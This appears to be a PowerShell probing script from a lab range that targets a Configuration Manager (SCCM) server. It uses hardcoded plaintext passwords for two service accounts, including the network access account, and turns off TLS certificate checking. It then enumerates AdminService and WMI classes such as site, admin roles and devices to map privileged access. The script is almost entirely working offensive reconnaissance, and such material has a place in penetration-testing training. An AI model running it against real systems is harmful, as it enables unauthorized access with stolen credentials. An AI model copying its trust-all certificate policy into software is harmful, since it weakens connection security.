# Probe /AdminService/wmi/ passthrough + svc_naa provider access — analyst_t1 (ws01)
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy7 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy7

$mp = 'mbr02.range.local'
$svcUser = 'range\svc_sccm'
$svcPass = 's3rv1c3_SCCM!'
$sec = ConvertTo-SecureString $svcPass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($svcUser, $sec)

function Get-AS($path) {
  $u = "https://$mp/AdminService/$path"
  try {
    $r = Invoke-WebRequest -Uri $u -Credential $cred -UseBasicParsing -TimeoutSec 25
    return "OK " + $r.StatusCode + " len=" + $r.Content.Length + " :: " + $r.Content.Substring(0, [Math]::Min(700, $r.Content.Length))
  } catch {
    $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
    return "ERROR $code : " + $_.Exception.Message
  }
}

Write-Output '=== A1. /AdminService/wmi/SMS_Site (svc_sccm NTLM) ==='
Write-Output (Get-AS 'wmi/SMS_Site')
Write-Output ''
Write-Output '=== A2. /AdminService/wmi/SMS_Admin (svc_sccm NTLM) ==='
Write-Output (Get-AS 'wmi/SMS_Admin')
Write-Output ''
Write-Output '=== A3. /AdminService/wmi/SMS_Device (svc_sccm NTLM) ==='
Write-Output (Get-AS 'wmi/SMS_Device')
Write-Output ''
Write-Output '=== A4. /AdminService/wmi/SMS_AdminRole (svc_sccm NTLM) ==='
Write-Output (Get-AS 'wmi/SMS_AdminRole')
Write-Output ''
Write-Output '=== B1. svc_naa DCOM to root\cimv2 ==='
$naa = New-Object System.Management.Automation.PSCredential('RANGE\svc_naa', (ConvertTo-SecureString 'N@A_s3rv1c3!' -AsPlainText -Force))
try {
  $c = Get-WmiObject -ComputerName $mp -Credential $naa -Namespace root\cimv2 -Class Win32_ComputerSystem -ErrorAction Stop
  Write-Output ("OK: " + $c.Name + " / " + $c.Domain)
} catch { Write-Output ("ERROR: " + $_.Exception.Message) }
Write-Output ''
Write-Output '=== B2. svc_naa DCOM to root\SMS\site_CAD (SMS_Site) ==='
try {
  $s = Get-WmiObject -ComputerName $mp -Credential $naa -Namespace root\SMS\site_CAD -Class SMS_Site -ErrorAction Stop | Select-Object -First 1
  Write-Output ("OK: SiteCode=" + $s.SiteCode + " SiteName=" + $s.SiteName)
} catch { Write-Output ("ERROR: " + $_.Exception.Message) }
Write-Output 'PROBE_DONE'
